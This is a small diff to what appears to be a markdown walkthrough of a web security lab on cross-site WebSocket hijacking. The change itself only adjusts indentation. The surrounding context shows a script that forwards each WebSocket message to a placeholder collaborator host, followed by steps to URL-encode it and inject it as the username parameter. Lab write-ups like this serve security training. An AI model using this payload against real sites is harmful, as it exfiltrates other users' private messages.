@@ -1791,7 +1791,7 @@ email=wiener@normal-user.com
           ws.onmessage = function(event) {
               fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
           };
-      </script>
+       </script>
        ```
      - **URL encode the whole script**
      - **Recreate the URL-encoded CSWSH payload as the username parameter**   
